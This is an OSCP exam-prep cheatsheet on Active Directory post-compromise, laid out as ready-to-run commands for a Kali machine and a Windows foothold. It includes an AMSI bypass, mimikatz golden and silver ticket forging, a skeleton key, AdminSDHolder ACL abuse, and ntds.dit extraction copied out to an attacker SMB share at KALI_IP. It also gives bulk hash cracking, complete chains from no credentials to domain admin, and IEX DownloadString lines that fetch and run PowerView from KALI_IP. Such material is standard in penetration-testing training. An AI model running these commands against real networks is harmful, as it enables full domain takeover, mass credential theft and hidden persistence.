# Active Directory — OSCP Cheatsheet Part 3C
## Persistence + Golden Ticket + Silver Ticket + NTDS.dit + Complete Scenarios

> **Legend:**
> `[KALI]` = Run on Kali (attack machine)
> `[WINDOWS]` = Run on victim/foothold Windows machine
>
> **Note:** For authorized penetration testing and OSCP exam lab environments only.

---

## Master Decision Tree — Post-DA Compromise

```
Domain Admin Access Achieved
            │
     ┌──────┴──────────────────────────┐
     │                                 │
  PERSISTENCE                    DUMP ALL HASHES
     │                                 │
     ├── Golden Ticket              vssadmin → ntds.dit
     │   (krbtgt hash)              ntdsutil → ntds.dit
     │   → 10yr DA access           secretsdump LOCAL
     │                                 │
     ├── Silver Ticket              hashcat bulk crack
     │   (service hash)
     │   → specific service
     │
     ├── Skeleton Key
     │   (mimikatz volatile)
     │
     └── AdminSDHolder
         (60min propagation)
```

---

## STEP 0 — Prerequisites Check

```bash
# You should have these before Part 3C:
# 1. krbtgt NT hash (from DCSync)
# 2. Domain SID
# 3. DA shell on DC

# Verify you have DA access
whoami /groups | findstr "Domain Admins"
```

---

## STEP 1 — Get Domain SID

### From Windows
`[WINDOWS]`
```cmd
# Method 1 — whoami
whoami /user

# Output:
# CORP\Administrator  S-1-5-21-1234567890-1234567890-1234567890-500
#                     └──────────────────────────────────────────┘
#                     Remove last -500 → this is your Domain SID
# Domain SID = S-1-5-21-1234567890-1234567890-1234567890
```

```powershell
# Method 2 — PowerView
Get-DomainSID

# Method 3 — built-in
Get-ADDomain | select DNSRoot, DomainSID
```

### From Kali
`[KALI]`
```bash
# impacket
impacket-getPac corp.local/Administrator:Password123! \
  -targetUser Administrator

# Look for "Domain SID" in output
```

---

## STEP 2 — Golden Ticket

### What It Does
```
Normal:  User → KDC → TGT → service access
Golden:  User → forge TGT (no KDC needed) → service access

Key facts:
- Uses krbtgt NT hash to forge any TGT
- Valid for 10 years by default
- Survives DA password changes
- Only invalidated by resetting krbtgt password TWICE
```

### Mimikatz — Inject into Memory
`[WINDOWS]`
```powershell
# AMSI bypass first
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Run mimikatz
.\mimikatz.exe
```

```
# Golden Ticket — inject directly (/ptt)
mimikatz # kerberos::golden /user:FakeAdmin /domain:corp.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /rc4:KRBTGT_NTHASH /id:500 /groups:512 /ptt

# Save to file instead of inject (/ticket)
mimikatz # kerberos::golden /user:FakeAdmin /domain:corp.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /rc4:KRBTGT_NTHASH /id:500 /groups:512 /ticket:C:\Temp\golden.kirbi
```

### Parameter Reference
| Parameter | Value | Meaning |
|-----------|-------|---------|
| `/user` | FakeAdmin | Any name — does NOT need to be real user |
| `/domain` | corp.local | Domain name |
| `/sid` | S-1-5-21-xxx-xxx-xxx | Domain SID — **without RID** |
| `/rc4` | krbtgt NT hash | **krbtgt hash — not service account** |
| `/id` | 500 | RID 500 = Administrator account |
| `/groups` | 512 | 512 = Domain Admins group |
| `/ptt` | — | Pass-the-Ticket — inject into memory |
| `/ticket` | file.kirbi | Save to file instead of inject |

### Verify Golden Ticket
`[WINDOWS]`
```cmd
# List tickets in memory
klist

# Test DC access
dir \\DC01\C$
dir \\DC01\ADMIN$

# Confirm identity
whoami
```

### Impacket — From Kali
`[KALI]`
```bash
# Step 1 — Create .ccache ticket file
impacket-ticketer \
  -nthash KRBTGT_NTHASH \
  -domain-sid S-1-5-21-1234567890-1234567890-1234567890 \
  -domain corp.local \
  FakeAdmin
# Output: FakeAdmin.ccache

# Step 2 — Set environment variable
export KRB5CCNAME=/path/to/FakeAdmin.ccache

# Step 3 — Use tools with -k -no-pass
# IMPORTANT: Use HOSTNAME not IP with Kerberos!
impacket-psexec corp.local/FakeAdmin@DC01.corp.local -k -no-pass
impacket-wmiexec corp.local/FakeAdmin@DC01.corp.local -k -no-pass
impacket-smbclient corp.local/FakeAdmin@DC01.corp.local -k -no-pass
impacket-secretsdump corp.local/FakeAdmin@DC01.corp.local -k -no-pass
```

### Load .kirbi on Windows
`[WINDOWS]`
```powershell
# Inject saved .kirbi file
Rubeus.exe ptt /ticket:C:\Temp\golden.kirbi

# Verify
klist
```

---

## STEP 3 — Silver Ticket

### Golden vs Silver
| | Golden Ticket | Silver Ticket |
|---|---|---|
| **Hash needed** | krbtgt NT hash | Service account NT hash |
| **Scope** | Entire domain | Single service only |
| **Contacts DC** | Yes (TGS-REQ) | **No** |
| **Stealth** | Lower | **Higher** |
| **Validity** | 10 years | Until service account pw change |
| **Hash source** | DCSync | Kerberoasting |

### Create Silver Ticket — Mimikatz
`[WINDOWS]`
```
# CIFS (SMB file access)
mimikatz # kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-xxx-xxx-xxx /rc4:SVC_ACCOUNT_NTHASH /target:WS01.corp.local /service:cifs /ptt

# WinRM access
mimikatz # kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-xxx-xxx-xxx /rc4:SVC_ACCOUNT_NTHASH /target:WS01.corp.local /service:wsman /ptt

# Host (PSExec style)
mimikatz # kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-xxx-xxx-xxx /rc4:SVC_ACCOUNT_NTHASH /target:WS01.corp.local /service:host /ptt
```

### Service Types Reference
| `/service` | Access |
|-----------|--------|
| `cifs` | SMB — file shares, dir \\host\share |
| `http` | Web services |
| `host` | PSExec / WMI style |
| `wsman` | WinRM — evil-winrm |
| `ldap` | LDAP queries |

---

## STEP 4 — Shadow Copy → NTDS.dit Extraction

### Why Needed
```
C:\Windows\NTDS\ntds.dit = AD database = ALL domain hashes
Problem: File is LOCKED while DC is running
Solution: Volume Shadow Copy (VSS) — copies locked files
Need: ntds.dit + SYSTEM hive to decrypt
```

### Method 1 — vssadmin
`[WINDOWS]`
```cmd
# Step 1 — Create shadow copy
vssadmin create shadow /for=C:

# Note the output:
# Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
#                                                                          ↑
#                                                               Number may vary (1,2,3...)
```

```cmd
# Step 2 — Copy ntds.dit from shadow
copy "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit" C:\Temp\ntds.dit

# Step 3 — Copy SYSTEM hive (needed for decryption)
copy "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM" C:\Temp\SYSTEM

# Step 4 — Copy SECURITY hive (optional — LSA secrets)
copy "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY" C:\Temp\SECURITY
```

```powershell
# Step 5 — Download to Kali
*Evil-WinRM* PS> download C:\Temp\ntds.dit /tmp/ntds.dit
*Evil-WinRM* PS> download C:\Temp\SYSTEM /tmp/SYSTEM
*Evil-WinRM* PS> download C:\Temp\SECURITY /tmp/SECURITY
```

```bash
# Alternative — SMB server on Kali
# [KALI]
impacket-smbserver share /tmp/loot -smb2support -username user -password pass

# [WINDOWS]
net use \\KALI_IP\share /user:user pass
copy C:\Temp\ntds.dit \\KALI_IP\share\ntds.dit
copy C:\Temp\SYSTEM \\KALI_IP\share\SYSTEM
```

### Method 2 — ntdsutil (Built-in, Cleaner)
`[WINDOWS]`
```cmd
# One command — creates full backup folder
ntdsutil "activate instance ntds" "ifm" "create full C:\Temp\ntdsbackup" quit quit

# Files created:
# C:\Temp\ntdsbackup\Active Directory\ntds.dit
# C:\Temp\ntdsbackup\registry\SYSTEM
```

```powershell
# Download
*Evil-WinRM* PS> download "C:\Temp\ntdsbackup\Active Directory\ntds.dit" /tmp/ntds.dit
*Evil-WinRM* PS> download "C:\Temp\ntdsbackup\registry\SYSTEM" /tmp/SYSTEM
```

### Parse NTDS.dit on Kali
`[KALI]`
```bash
# Parse offline — get all hashes
impacket-secretsdump \
  -ntds /tmp/ntds.dit \
  -system /tmp/SYSTEM \
  LOCAL

# Save to file
impacket-secretsdump \
  -ntds /tmp/ntds.dit \
  -system /tmp/SYSTEM \
  LOCAL > /tmp/all_hashes.txt

# Output format:
# Administrator:500:aad3b435...:32ed87bdb5fdc5e9:::
# krbtgt:502:aad3b435...:9e17a9b02ae06a1e5:::   ← Golden Ticket key
# jdoe:1103:aad3b435...:44f77b6a3c8a8d9b:::
```

### Bulk Crack All Hashes
`[KALI]`
```bash
# Crack with usernames preserved
hashcat --username -m 1000 /tmp/all_hashes.txt /usr/share/wordlists/rockyou.txt

# With rules
hashcat --username -m 1000 /tmp/all_hashes.txt /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule

# Show all cracked
hashcat --username -m 1000 /tmp/all_hashes.txt --show

# Extract NT hashes only for cracking
cut -d: -f4 /tmp/all_hashes.txt | sort -u > /tmp/nt_only.txt
hashcat -m 1000 /tmp/nt_only.txt /usr/share/wordlists/rockyou.txt
```

---

## STEP 5 — Additional Persistence

### Skeleton Key (Volatile)
`[WINDOWS]`
```powershell
# Mimikatz — sets "mimikatz" as master password for ALL users
.\mimikatz.exe "privilege::debug" "misc::skeleton" "exit"

# Now ANY user can login with password "mimikatz"
# evil-winrm -i DC_IP -u Administrator -p 'mimikatz'
# evil-winrm -i DC_IP -u jdoe -p 'mimikatz'

# WARNING: Volatile — gone after reboot
```

### AdminSDHolder Abuse
`[WINDOWS]`
```powershell
# Add GenericAll on AdminSDHolder container
# SDProp runs every 60 min → applies your ACE to all protected accounts

Add-DomainObjectAcl \
  -TargetIdentity "CN=AdminSDHolder,CN=System,DC=corp,DC=local" \
  -PrincipalIdentity jdoe \
  -Rights All \
  -Verbose

# Wait 60 min OR manually trigger SDProp
# After propagation — jdoe has GenericAll on Domain Admins, Enterprise Admins, etc.
```

---

## STEP 6 — Complete Attack Scenarios

### Scenario A — Full Chain from Zero

```
Start: No creds | DC: 10.10.10.10 | WS01: 10.10.10.11
```

`[KALI]`
```bash
# Phase 1 — Recon
nmap -sC -sV -p 53,88,135,139,389,445,3268,3389,5985 10.10.10.10 -oN dc_scan.txt
echo "10.10.10.10 DC01.corp.local DC01 corp.local" >> /etc/hosts
nxc smb 10.10.10.10

# Phase 2 — User enumeration
rpcclient -U "" -N 10.10.10.10 -c "enumdomusers" \
  | grep -oP '\[.*?\]' | grep -v '0x' | tr -d '[]' > userlist.txt
rpcclient -U "" -N 10.10.10.10 -c "getdompwinfo"    # check lockout!
enum4linux-ng -A 10.10.10.10 | tee enum4linux.txt

# Phase 3 — AS-REP Roast (no creds)
impacket-GetNPUsers corp.local/ \
  -usersfile userlist.txt \
  -dc-ip 10.10.10.10 \
  -no-pass -format hashcat \
  -outputfile asrep.txt
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
# Result: svc_backup:Password123!

# Phase 4 — Validate + BloodHound
nxc smb 10.10.10.10 -u svc_backup -p 'Password123!' -d corp.local
bloodhound-python -u svc_backup -p 'Password123!' \
  -d corp.local -dc DC01.corp.local \
  -ns 10.10.10.10 -c All --zip
# Import to BloodHound → Shortest Path from Owned
# Found: svc_backup →[GenericAll]→ Domain Admins
```

`[WINDOWS]`
```powershell
# Phase 5 — GenericAll abuse
evil-winrm -i 10.10.10.10 -u svc_backup -p 'Password123!'
*Evil-WinRM* PS> IEX (New-Object Net.WebClient).DownloadString('http://KALI_IP/PowerView.ps1')
*Evil-WinRM* PS> Add-DomainGroupMember -Identity 'Domain Admins' -Members 'svc_backup' -Verbose
*Evil-WinRM* PS> Get-DomainGroupMember -Identity 'Domain Admins'
```

`[KALI]`
```bash
# Phase 6 — DCSync
impacket-secretsdump corp.local/svc_backup:Password123!@10.10.10.10 -just-dc
# Save: Administrator NTHASH, krbtgt NTHASH

# Phase 7 — DA shell + proof
impacket-psexec corp.local/Administrator@10.10.10.10 -hashes :ADMIN_NTHASH
# C:\> type C:\Users\Administrator\Desktop\proof.txt

# Phase 8 — Golden Ticket (persistence)
impacket-ticketer \
  -nthash KRBTGT_NTHASH \
  -domain-sid S-1-5-21-xxx-xxx-xxx \
  -domain corp.local FakeAdmin
export KRB5CCNAME=FakeAdmin.ccache
impacket-psexec corp.local/FakeAdmin@DC01.corp.local -k -no-pass
```

---

### Scenario B — SeImpersonatePrivilege Chain

```
Start: Low priv shell on WS01 (10.10.10.11) — not local admin
```

`[KALI]`
```bash
# Step 1 — Connect
evil-winrm -i 10.10.10.11 -u lowpriv -p 'Password123!'
```

`[WINDOWS]`
```cmd
# Step 2 — Check privileges
whoami /priv
# SeImpersonatePrivilege   Enabled ← found!
```

```powershell
# Step 3 — Upload + escalate
*Evil-WinRM* PS> upload /opt/PrintSpoofer64.exe C:\Temp\PrintSpoofer.exe
*Evil-WinRM* PS> C:\Temp\PrintSpoofer.exe -i -c cmd
# → nt authority\system
```

```cmd
# Step 4 — Mimikatz from SYSTEM
C:\Temp\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
# Found: asmith NTHASH
```

`[KALI]`
```bash
# Step 5 — Sweep
nxc smb 10.10.10.0/24 -u asmith -H ASMITH_NTHASH
# 10.10.10.12 (WS02) → Pwn3d!

# Step 6 — WS02 shell + dump
impacket-wmiexec corp.local/asmith@10.10.10.12 -hashes :ASMITH_NTHASH
impacket-secretsdump corp.local/asmith@10.10.10.12 -hashes :ASMITH_NTHASH
# Found: DA_Admin NTHASH

# Step 7 — DC shell
impacket-psexec corp.local/DA_Admin@10.10.10.10 -hashes :DA_NTHASH
# type C:\Users\Administrator\Desktop\proof.txt
```

---

### Scenario C — WriteDACL → DCSync → DA

```
Start: jdoe:Password123! | BloodHound shows jdoe →[WriteDACL]→ Domain Object
```

`[KALI]`
```bash
# Step 1 — Shell
evil-winrm -i 10.10.10.10 -u jdoe -p 'Password123!'
```

`[WINDOWS]`
```powershell
# Step 2 — Add DCSync rights
*Evil-WinRM* PS> IEX (New-Object Net.WebClient).DownloadString('http://KALI_IP/PowerView.ps1')
*Evil-WinRM* PS> Add-DomainObjectAcl \
  -TargetIdentity "DC=corp,DC=local" \
  -PrincipalIdentity jdoe \
  -Rights DCSync \
  -Verbose

# Verify rights added
*Evil-WinRM* PS> Get-DomainObjectAcl -Identity "DC=corp,DC=local" \
  -ResolveGUIDs | Where-Object { $_.SecurityIdentifier -match "jdoe" }
```

`[KALI]`
```bash
# Step 3 — DCSync
impacket-secretsdump corp.local/jdoe:Password123!@10.10.10.10 -just-dc
# Administrator:500:aad3...:ADMIN_NTHASH:::

# Step 4 — DA shell
evil-winrm -i 10.10.10.10 -u Administrator -H ADMIN_NTHASH

# Step 5 — Proof
# type C:\Users\Administrator\Desktop\proof.txt

# Step 6 — Get krbtgt for Golden Ticket
impacket-secretsdump corp.local/Administrator@10.10.10.10 \
  -hashes :ADMIN_NTHASH \
  -just-dc-user krbtgt
```

---

## Complete Attack Chain — 1A to 3C

```
[KALI LINUX]
     │
     ▼
═══════════════════════════════════════════════════════════
PHASE 1 — RECON (No Creds)          Tools Used
═══════════════════════════════════════════════════════════
nmap -sC -sV -p- DC_IP              nmap
/etc/hosts update                   manual
nxc smb DC_IP (null session)        netexec
smbclient -N -L //DC_IP             smbclient
rpcclient enumdomusers              rpcclient        → userlist.txt
rpcclient getdompwinfo              rpcclient        → lockout threshold
enum4linux-ng -A DC_IP              enum4linux-ng

═══════════════════════════════════════════════════════════
PHASE 2 — FIRST CREDENTIAL          Tools Used
═══════════════════════════════════════════════════════════
GetNPUsers → asrep.txt              impacket
hashcat -m 18200 asrep.txt          hashcat          → svc_backup:Pass123!
nxc smb validate                    netexec

═══════════════════════════════════════════════════════════
PHASE 3 — ENUMERATION WITH CREDS    Tools Used
═══════════════════════════════════════════════════════════
bloodhound-python -c All            bloodhound-py    → .zip imported
GetUserSPNs -request                impacket         → kerb hashes
hashcat -m 13100                    hashcat          → svc_sql:SqlPass!
BloodHound: Shortest Path                            → attack path found

═══════════════════════════════════════════════════════════
PHASE 4 — PRIVILEGE ESCALATION      Tools Used
═══════════════════════════════════════════════════════════
evil-winrm shell                    evil-winrm
PowerView Add-DomainGroupMember     PowerView        → DA membership
OR: Add-DomainObjectAcl DCSync      PowerView        → DCSync rights
OR: PrintSpoofer → SYSTEM           PrintSpoofer     → SYSTEM shell

═══════════════════════════════════════════════════════════
PHASE 5 — DOMAIN COMPROMISE         Tools Used
═══════════════════════════════════════════════════════════
secretsdump -just-dc                impacket         → all hashes
psexec/wmiexec/evil-winrm           impacket         → DA shell
type proof.txt                      cmd              → FLAG CAPTURED

═══════════════════════════════════════════════════════════
PHASE 6 — PERSISTENCE + FULL DUMP   Tools Used
═══════════════════════════════════════════════════════════
vssadmin + copy ntds.dit            vssadmin         → offline DB
secretsdump -ntds LOCAL             impacket         → all hashes
hashcat -m 1000 bulk crack          hashcat          → plaintext pwds
impacket-ticketer (Golden Ticket)   impacket         → 10yr DA access
```

---

## Quick Reference — All Commands

### Get Domain SID
```cmd
whoami /user                                          # Windows
Get-DomainSID                                         # PowerView
```

### Golden Ticket
```
# Mimikatz
kerberos::golden /user:ANY /domain:DOMAIN /sid:DOMAINSID /rc4:KRBTGT_HASH /id:500 /groups:512 /ptt

# Impacket
impacket-ticketer -nthash KRBTGT_HASH -domain-sid DOMAINSID -domain DOMAIN USERNAME
export KRB5CCNAME=USERNAME.ccache
impacket-psexec DOMAIN/USERNAME@DCFQDN -k -no-pass
```

### Silver Ticket
```
# Mimikatz
kerberos::golden /user:ANY /domain:DOMAIN /sid:SID /rc4:SVC_HASH /target:TARGET_FQDN /service:cifs /ptt
```

### NTDS.dit Extraction
```cmd
# vssadmin
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\Temp\ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Temp\SYSTEM

# ntdsutil
ntdsutil "activate instance ntds" "ifm" "create full C:\Temp\backup" quit quit
```

```bash
# Parse offline
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL > all_hashes.txt

# Bulk crack
hashcat --username -m 1000 all_hashes.txt /usr/share/wordlists/rockyou.txt
```

---

## Golden vs Silver vs Normal PtH

| Technique | Key Needed | Scope | DC Contact | Best Use |
|-----------|-----------|-------|------------|----------|
| Pass-the-Hash | NT hash | One machine | No | Quick lateral move |
| Silver Ticket | Service account hash | One service | No | Stealth service access |
| Golden Ticket | krbtgt hash | Entire domain | Minimal | Persistence |

---

## Common Errors + Fixes

| Error | Cause | Fix |
|-------|-------|-----|
| `Clock skew` Golden Ticket | Time mismatch | `sudo ntpdate DC_IP` |
| `KRB_AP_ERR_MODIFIED` | Wrong hash used | Verify krbtgt hash from DCSync |
| `-k no-pass` fails | Using IP not hostname | Use FQDN: DC01.corp.local |
| `vssadmin failed` | Not SYSTEM/DA | Escalate privileges first |
| `ntds.dit copy failed` | Wrong shadow path | Re-run vssadmin, check exact path |
| Golden Ticket no access | Wrong domain SID | Re-extract SID, check RID removed |

---

## Tools Install + Download

`[KALI]`
```bash
# Impacket tools (ticketer, secretsdump, etc.)
pip install impacket
sudo apt install python3-impacket

# Verify impacket tools
which impacket-ticketer impacket-secretsdump impacket-getPac

# PrintSpoofer (for SeImpersonatePrivilege)
wget https://github.com/itm4n/PrintSpoofer/releases/latest/download/PrintSpoofer64.exe \
  -O /opt/PrintSpoofer64.exe

# GodPotato
wget https://github.com/BeichenDream/GodPotato/releases/latest/download/GodPotato-NET4.exe \
  -O /opt/GodPotato.exe

# Mimikatz
wget https://github.com/gentilkiwi/mimikatz/releases/latest/download/mimikatz_trunk.zip \
  -O /tmp/mimi.zip
unzip /tmp/mimi.zip -d /opt/mimikatz/
```

---

## OSCP Exam Tips — Part 3C

```
1. Save krbtgt hash IMMEDIATELY after DCSync — it's your persistence key
2. Domain SID: remove the last -RID part (e.g. -500) before using in Golden Ticket
3. Golden Ticket with Impacket: always use HOSTNAME not IP (-k -no-pass)
4. vssadmin: note the exact shadow copy number in output — may not always be 1
5. ntdsutil is cleaner than vssadmin — use it if available
6. Always capture proof.txt immediately after DA shell — screenshot too
7. Bulk crack all hashes from ntds.dit — some plaintext passwords are gold
8. Golden Ticket survives DA password change — only krbtgt double-reset kills it
9. Silver Ticket is stealthier — no DC contact means less log noise
10. After full compromise — document every hash, every path for exam report
```

---

## Checklist

```
[ ] Domain SID obtained
[ ] Golden Ticket created (Mimikatz or impacket-ticketer)
[ ] Golden Ticket verified (klist + dir \\DC\C$)
[ ] Silver Ticket concept understood
[ ] vssadmin shadow copy created
[ ] ntds.dit + SYSTEM copied
[ ] Files downloaded to Kali
[ ] impacket-secretsdump LOCAL run
[ ] All hashes saved to file
[ ] Bulk hashcat crack attempted
[ ] krbtgt hash saved for Golden Ticket
[ ] Administrator hash saved for PtH
[ ] proof.txt captured + documented
```

---

*Part 3C — Persistence + Golden Ticket + NTDS.dit Extraction*
*Next → Part 4: OSCP Exam Strategy + Final Prep + Report Writing*
